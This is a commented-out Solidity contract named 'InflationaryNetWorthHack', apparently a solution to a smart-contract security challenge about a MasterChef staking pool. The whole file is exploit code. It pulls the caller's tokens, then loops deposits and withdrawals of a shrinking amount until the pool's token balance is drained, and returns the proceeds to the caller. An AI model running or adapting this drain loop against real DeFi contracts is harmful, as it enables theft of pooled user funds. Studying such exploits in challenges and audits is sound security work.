// pragma solidity ^0.8.0;

// import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
// import "../inflationary-net-worth/MasterChef.sol";
// import "hardhat/console.sol";

// contract InflationaryNetWorthHack {
//     function run(MasterChef _masterchef, IERC20 _mula) external {
//         uint256 amount = _mula.balanceOf(msg.sender);
//         _mula.transferFrom(msg.sender, address(this), amount);
//         console.log(_mula.balanceOf(address(this)));
//         _mula.approve(address(_masterchef), type(uint256).max);
//         while (true) {
//             _masterchef.deposit(0, amount);
//             uint256 masterchefBalance = _mula.balanceOf(address(_masterchef)) -
//                 1;
//             console.log(masterchefBalance);
//             if (masterchefBalance < amount) {
//                 _masterchef.withdraw(0, masterchefBalance);
//                 break;
//             } else {
//                 _masterchef.withdraw(0, amount);
//             }
//             amount = (amount * 95) / 100;
//         }
//         _masterchef.deposit(0, 1);
//         _mula.transfer(msg.sender, _mula.balanceOf(address(this)));
//     }
// }
